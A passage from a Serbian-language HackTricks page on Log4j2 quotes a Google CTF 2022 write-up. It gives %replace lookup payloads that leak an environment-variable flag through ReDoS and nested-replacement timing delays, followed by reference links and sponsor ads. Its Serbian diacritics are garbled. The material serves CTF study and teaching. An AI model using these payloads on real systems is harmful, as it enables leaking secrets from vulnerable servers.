Na primer, payload poput `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` bi izazvao **zadr쬬vanje** u tom CTF-u.

U ovom [**writeup-u**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/), umesto kori코캖enja ReDoS napada, kori코캖en je **napad amplifikacije** kako bi se izazvala razlika u vremenu odgovora:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> Ako zastava po캜inje sa `flagGuess`, cela zastava 캖e biti zamenjena sa 29 `#`-a (koristio sam ovaj karakter jer verovatno ne캖e biti deo zastave). **Svaki od rezultiraju캖ih 29 `#`-a je zatim zamenjen sa 54 `#`-a**. Ovaj proces se ponavlja **6 puta**, 코to dovodi do ukupno ` 29*54*54^6* =`` `` `**`96816014208`  `#`-a!**
>
> Zamena toliko `#`-a 캖e izazvati 10-sekundno zadr쬬vanje Flask aplikacije, 코to 캖e rezultirati slanjem HTTP status koda 500 korisniku. (Ako zastava ne po캜inje sa `flagGuess`, dobi캖emo status kod koji nije 500)

## Reference

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Prona캠ite najva쬹ije ranjivosti kako biste ih br쬰 popravili. Intruder prati va코u povr코inu napada, pokre캖e proaktivne pretrage pretnji, pronalazi probleme u celokupnom tehnolo코kom skupu, od API-ja do veb aplikacija i cloud sistema. [**Isprobajte ga besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
